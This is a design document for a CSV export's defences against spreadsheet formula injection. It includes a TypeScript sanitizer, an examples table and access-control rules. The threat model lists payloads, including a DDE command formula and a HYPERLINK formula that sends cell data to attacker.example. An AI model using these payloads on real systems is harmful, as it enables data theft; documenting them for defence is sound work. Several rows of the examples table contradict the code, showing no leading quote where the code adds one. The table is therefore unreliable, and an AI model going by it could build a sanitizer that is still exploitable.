# Data Export Security Model & Formula Injection Mitigation

## 1. Vulnerability Threat Model: CSV Spreadsheet Formula Injection (CWE-1236)

When exporting reporting data to CSV format, malicious input strings entered by users or administrators (e.g. candidate names, party titles, state notes) can be interpreted by spreadsheet applications (Microsoft Excel, LibreOffice Calc, Google Sheets) as executable formulas if they begin with specific characters.

### Targeted Attack Vectors:
1. **Dynamic Data Execution**: `=cmd|'/C calc'!A0` or `=SUM(...)`.
2. **Data Exfiltration**: `=HYPERLINK("https://attacker.example/log?v=" & A1, "Click Here")`.
3. **Control Character Confusion**: Leading `@`, `+`, `-`, tabs (`\t`), or carriage returns (`\r`).

---

## 2. Sanitization Architecture

The sanitization engine is implemented in `backend/src/modules/analytics/analytics.export.service.ts` via the `sanitizeCsvCell` function:

```typescript
const INJECTION_PREFIXES = ['=', '+', '-', '@', '\t', '\r'];

export function sanitizeCsvCell(value: unknown): string {
  if (value === null || value === undefined) {
    return '""';
  }
  let str = String(value);

  // If cell starts with formula characters or control bytes, neutralize it with a leading single quote (')
  if (INJECTION_PREFIXES.some(prefix => str.startsWith(prefix))) {
    str = `'${str}`;
  }

  // Escape inner double quotes by doubling them ("" -> """")
  str = str.replace(/"/g, '""');

  return `"${str}"`;
}
```

### Sanitization Examples:

| Raw Input Cell Value | Neutralized Sanitized CSV Output | Result in Excel / Calc |
| :--- | :--- | :--- |
| `=1+2` | `"'=1+2"` | Displayed as plain text string `=1+2` |
| `+cmd\|/C calc!A0` | `"+cmd\|/C calc!A0"` | Safely escaped and rendered as text |
| `-250` (numeric string) | `"-250"` | Neutralized with leading quote, preventing command evaluation |
| `@HYPERLINK(...)` | `'@HYPERLINK(...)'` | Prevents automated outbound network callbacks |
| `Indian National Congress` | `"Indian National Congress"` | Preserved with standard RFC 4180 quotes |
| `Quote "Test" Name` | `"Quote ""Test"" Name"` | Doubled RFC 4180 quotation escaping |

---

## 3. Export Access Control & Audit Governance

1. **Permission Gating**:
   Exporting datasets requires the explicit `ANALYTICS_EXPORT` permission.
   - `SUPER_ADMIN`, `NATIONAL_ADMIN`, and `READ_ONLY_AUDITOR` have export permissions globally.
   - `STATE_ADMIN` has export permissions constrained strictly to their assigned state jurisdiction.
   - Unauthenticated or public users cannot access export endpoints (`/api/v1/admin/analytics/export`).

2. **Audit Trail Logging**:
   Every invocation of `/export` generates an immutable entry in the `AuditLog` table with:
   - `action`: `ANALYTICS_EXPORT_GENERATED`
   - `adminId`: UUID of requesting administrator
   - `resourceType`: `ANALYTICS_EXPORT`
   - `resourceId`: Report type (e.g., `NATIONAL_OVERVIEW`, `STATE_DASHBOARD`, `COUNTING_RESULTS`)
   - `ipAddress`: Request source IP
   - `userAgent`: Client agent string
   - `details`: Format (`CSV` or `JSON`), target parameters, and record counts.

3. **Rate Limiting & Memory Bounding**:
   - Max query limit of 5,000 rows per export request to prevent Denial-of-Service (DoS) and heap exhaustion.
   - Streaming buffer generation directly to the HTTP response stream.
